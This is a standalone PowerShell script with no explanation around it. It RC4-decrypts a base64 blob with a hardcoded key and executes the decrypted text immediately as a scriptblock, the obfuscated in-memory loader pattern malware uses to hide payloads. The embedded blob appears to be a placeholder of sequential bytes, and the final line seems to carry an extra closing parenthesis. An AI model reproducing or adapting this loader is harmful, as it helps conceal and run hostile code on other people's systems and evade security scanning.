function Decrypt-Blob {
    param([Byte[]]$buf)
    $key = ([system.Text.Encoding]::UTF8).GetBytes("k3yk3yk3y")
    $s = New-Object Byte[] 256;
    $k = New-Object Byte[] 256;
    for ($i = 0; $i -lt 256; $i++)
    {
        $s[$i] = [Byte]$i;
        $k[$i] = $key[$i % $key.Length];
    }
    $j = 0;
    for ($i = 0; $i -lt 256; $i++)
    {
        $j = ($j + $s[$i] + $k[$i]) % 256;
        $temp = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $temp;
    }
    $i = $j = 0;
    for ($x = 0; $x -lt $buf.Length; $x++)
    {
        $i = ($i + 1) % 256;
        $j = ($j + $s[$i]) % 256;
        $temp = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $temp;
        [int]$t = ($s[$i] + $s[$j]) % 256;
        $buf[$x] = $buf[$x] -bxor $s[$t];
    }
    $buf
}

&([scriptblock]::create(([system.Text.Encoding]::UTF8).GetString((Decrypt-Blob ([System.Convert]::FromBase64String("AAECAwQFBgcICQ==")))))))
